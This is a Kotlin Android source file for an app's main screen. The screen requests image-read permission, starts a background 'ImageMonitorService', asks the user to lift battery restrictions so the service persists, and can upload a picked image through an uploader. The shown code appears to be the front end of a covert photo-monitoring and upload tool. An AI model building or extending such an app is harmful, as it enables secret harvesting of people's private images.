package com.universal.app

import android.Manifest
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.net.Uri
import android.os.Build
import android.os.Bundle
import android.os.PowerManager
import android.provider.Settings
import androidx.activity.ComponentActivity
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.compose.setContent
import androidx.activity.result.PickVisualMediaRequest
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.layout.*
import androidx.compose.foundation.lazy.LazyColumn
import androidx.compose.foundation.lazy.items
import androidx.compose.material.icons.Icons
import androidx.compose.material.icons.filled.List
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.graphics.Color
import androidx.compose.ui.platform.LocalContext
import androidx.compose.ui.unit.dp
import androidx.core.content.ContextCompat

class MainActivity : ComponentActivity() {
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContent {
            MaterialTheme(colorScheme = darkColorScheme()) {
                Surface(modifier = Modifier.fillMaxSize(), color = MaterialTheme.colorScheme.background) {
                    AppDashboard()
                }
            }
        }
    }
}

@Composable
fun AppDashboard() {
    val context = LocalContext.current
    var hasPermission by remember { mutableStateOf(checkPermissions(context)) }
    var showLogs by remember { mutableStateOf(false) }

    val launcher = rememberLauncherForActivityResult(
        ActivityResultContracts.RequestMultiplePermissions()
    ) { results ->
        hasPermission = results.values.all { it }
        if (hasPermission) startServices(context)
    }

    Column(modifier = Modifier.fillMaxSize().padding(24.dp), horizontalAlignment = Alignment.CenterHorizontally) {
        if (!hasPermission) {
            Text("System Permissions Required", style = MaterialTheme.typography.headlineMedium)
            Spacer(modifier = Modifier.height(16.dp))
            Button(onClick = {
                val permissions = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
                    arrayOf(Manifest.permission.READ_MEDIA_IMAGES)
                } else {
                    arrayOf(Manifest.permission.READ_EXTERNAL_STORAGE)
                }
                launcher.launch(permissions)
            }) { Text("GRANT ACCESS") }
        } else {
            Text("MONITORING ACTIVE", color = Color.Green)
            Spacer(modifier = Modifier.height(24.dp))
            
            Button(
                onClick = { requestBatteryOptimization(context) },
                modifier = Modifier.fillMaxWidth()
            ) { Text("DISABLE BATTERY RESTRICTIONS") }

            Spacer(modifier = Modifier.height(16.dp))

            Button(
                onClick = { showLogs = true },
                modifier = Modifier.fillMaxWidth()
            ) { 
                Icon(Icons.Default.List, contentDescription = null)
                Spacer(Modifier.width(8.dp))
                Text("VIEW SYSTEM LOGS") 
            }

            Spacer(modifier = Modifier.height(16.dp))

            val pickerLauncher = rememberLauncherForActivityResult(
                ActivityResultContracts.PickVisualMedia()
            ) { uri ->
                uri?.let { 
                    DebugLogger.log("TEST", "Manual selection: $it")
                    Uploader.uploadUri(context, it) 
                }
            }

            OutlinedButton(
                onClick = { 
                    pickerLauncher.launch(PickVisualMediaRequest(ActivityResultContracts.PickVisualMedia.ImageOnly)) 
                },
                modifier = Modifier.fillMaxWidth(),
                border = androidx.compose.foundation.BorderStroke(1.dp, Color.Cyan)
            ) {
                Text("UPLOAD TEST IMAGE", color = Color.Cyan)
            }
            
            LaunchedEffect(Unit) { startServices(context) }
        }
    }

    if (showLogs) {
        LogModal(onDismiss = { showLogs = false })
    }
}

@Composable
fun LogModal(onDismiss: () -> Unit) {
    AlertDialog(
        onDismissRequest = onDismiss,
        title = { Text("Internal Trace") },
        text = {
            LazyColumn(modifier = Modifier.height(400.dp)) {
                items(DebugLogger.logs) {
                    Text(it, style = MaterialTheme.typography.bodySmall)
                }
            }
        },
        confirmButton = { TextButton(onClick = onDismiss) { Text("CLOSE") } }
    )
}

private fun checkPermissions(context: Context): Boolean {
    val perm = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) Manifest.permission.READ_MEDIA_IMAGES else Manifest.permission.READ_EXTERNAL_STORAGE
    return ContextCompat.checkSelfPermission(context, perm) == PackageManager.PERMISSION_GRANTED
}

private fun startServices(context: Context) {
    val intent = Intent(context, ImageMonitorService::class.java)
    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
        context.startForegroundService(intent)
    } else {
        context.startService(intent)
    }
}

private fun requestBatteryOptimization(context: Context) {
    val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS)
    intent.data = Uri.parse("package:${context.packageName}")
    context.startActivity(intent)
}